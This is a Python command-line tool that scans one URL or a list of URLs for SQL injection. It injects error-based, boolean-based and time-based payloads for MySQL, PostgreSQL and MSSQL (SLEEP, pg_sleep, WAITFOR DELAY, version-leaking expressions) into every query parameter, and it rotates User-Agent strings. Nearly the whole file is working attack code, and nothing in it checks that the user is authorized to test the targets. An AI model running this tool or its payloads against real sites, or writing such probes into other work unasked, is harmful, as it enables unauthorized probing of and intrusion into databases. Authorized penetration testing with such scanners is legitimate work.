import requests
import time
import argparse
import sys
import random
from urllib.parse import urlparse, parse_qs, urlunparse

G = '\033[92m'
Y = '\033[93m'
R = '\033[91m'
C = '\033[96m'
W = '\033[0m'

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
]

VERSION = "1.0"

def banner():
    print(rf"""{C}
               __                    
   _________ _/ /_____________ _____ 
  / ___/ __ `/ / ___/ ___/ __ `/ __ \ 1.0
 (__  ) /_/ / (__  ) /__/ /_/ / / / /
/____/\__, /_/____/\___/\__,_/_/ /_/ 
|-------/_/=======]--------------->

{W}""")

def get_args():
    parser = argparse.ArgumentParser(
        usage="python3 %(prog)s [options]"
    )
    parser.add_argument(
        "-u", "--url",
        help="Target URL (example: http://site.com/page.php?id=1)"
    )
    parser.add_argument(
        "-l", "--list",
        help="Scan multiple targets from file (example: targets.txt)"
    )
    parser.add_argument(
        "-v", "--version",
        action="store_true",
        help="Show program version"
    )
    args = parser.parse_args()

    if args.version:
        print(f"{G}{VERSION}{W}")
        sys.exit(0)

    if not args.url and not args.list:
        parser.print_help()
        sys.exit(1)

    if args.url and args.list:
        sys.exit(f"{R}[ERROR]{W} Use -u OR -l, not both")

    return args

def scan_target(target_url):
    parsed = urlparse(target_url)
    if not parsed.query:
        print(f"{R}[SKIP]{W} No parameters found: {target_url}")
        return

    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
    query_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

    print(f"\n{G}[START]{W} Target: {C}{base_url}{W}")
    print(f"{G}[INFO]{W} Parameters found: {', '.join(query_params.keys())}")

    for p in query_params:
        check_sqli(base_url, query_params, p)

def verify_time_based(url, params, p_name, headers, db_type, payload_template):
    checks = [3, 7]
    results = []

    print(f"      {Y}[INFO]{W} Verifying {db_type} Time-Based (double check)")

    for sec in checks:
        payload = payload_template.format(sec=sec)
        test_params = params.copy()
        test_params[p_name] = f"{params[p_name]}{payload}"

        start = time.time()
        try:
            requests.get(url, params=test_params, headers=headers, timeout=sec + 5)
            duration = time.time() - start

            if duration >= sec:
                print(f"      {G}[OK]{W} Delay {sec}s confirmed")
                results.append(True)
            else:
                print(f"      {Y}[INFO]{W} Delay {sec}s not matched")
                results.append(False)

        except (requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError):
            print(f"      {G}[OK]{W} Timeout detected ({sec}s)")
            results.append(True)

    return all(results)

def check_sqli(base_url, current_params, p_name):
    print(f"\n{C}{'='*60}{W}")
    print(f"{Y}[TEST]{W} Parameter: {C}{p_name}{W}")
    print(f"{C}{'='*60}{W}")

    headers = {"User-Agent": random.choice(USER_AGENTS)}

    db_payloads = {
        "MySQL": {
            "error": "' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)-- -",
            "time": "' AND (SELECT 1 FROM (SELECT(SLEEP({sec})))a)-- -",
            "keywords": ["xpath", "mariadb", "sql syntax", "kex_xpath"]
        },
        "PostgreSQL": {
            "error": "' AND 1=(SELECT 1 FROM (SELECT count(*),concat(0x7e,(SELECT version()),0x7e)x FROM information_schema.tables GROUP BY x)a)-- -",
            "time": "' AND (SELECT 5 FROM pg_sleep({sec}))-- -",
            "keywords": ["invalid input syntax", "postgre", "pg_sleep"]
        },
        "MSSQL": {
            "error": "' AND 1=CONVERT(int,@@version)-- -",
            "time": "'; WAITFOR DELAY '0:0:{sec}'-- -",
            "keywords": ["unclosed quotation mark", "microsoft ole db", "sql server"]
        }
    }

    # Error
    for db, payloads in db_payloads.items():
        tp = current_params.copy()
        tp[p_name] = f"{current_params[p_name]}{payloads['error']}"
        try:
            r = requests.get(base_url, params=tp, headers=headers, timeout=10)
            if any(key in r.text.lower() for key in payloads['keywords']):
                print(f"  {R}[VULN]{W} {db} Error-Based SQL Injection detected!")
                return
        except:
            pass

    # Boolean
    try:
        tp_t = current_params.copy()
        tp_f = current_params.copy()
        tp_t[p_name] = f"{current_params[p_name]}' OR 1=1-- -"
        tp_f[p_name] = f"{current_params[p_name]}' OR 1=2-- -"

        r_t = requests.get(base_url, params=tp_t, headers=headers, timeout=10)
        r_f = requests.get(base_url, params=tp_f, headers=headers, timeout=10)

        if abs(len(r_t.text) - len(r_f.text)) > 50:
            print(f"  {Y}[INFO]{W} Boolean-Based indication detected")
    except:
        pass

    # Time
    for db, payloads in db_payloads.items():
        tp_time = current_params.copy()
        tp_time[p_name] = f"{current_params[p_name]}{payloads['time'].format(sec=5)}"

        start = time.time()
        try:
            requests.get(base_url, params=tp_time, headers=headers, timeout=15)
            if time.time() - start >= 5:
                if verify_time_based(base_url, current_params, p_name, headers, db, payloads['time']):
                    print(f"  {R}[VULN]{W} {db} Time-Based SQL Injection CONFIRMED")
                    break
        except requests.exceptions.ReadTimeout:
            print(f"  {R}[VULN]{W} {db} Time-Based SQL Injection (Timeout)")
            break
        except:
            pass

def main():
    banner()
    args = get_args()

    if args.url:
        scan_target(args.url)

    if args.list:
        try:
            with open(args.list, "r") as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            sys.exit(f"{R}[ERROR]{W} File not found: {args.list}")

        print(f"{G}[INFO]{W} Loaded {len(targets)} targets from file\n")

        for i, target in enumerate(targets, 1):
            print(f"{C}[TARGET {i}/{len(targets)}]{W} {target}")
            scan_target(target)

    print(f"\n{G}[DONE]{W} Scan finished")

if __name__ == "__main__":
    main()
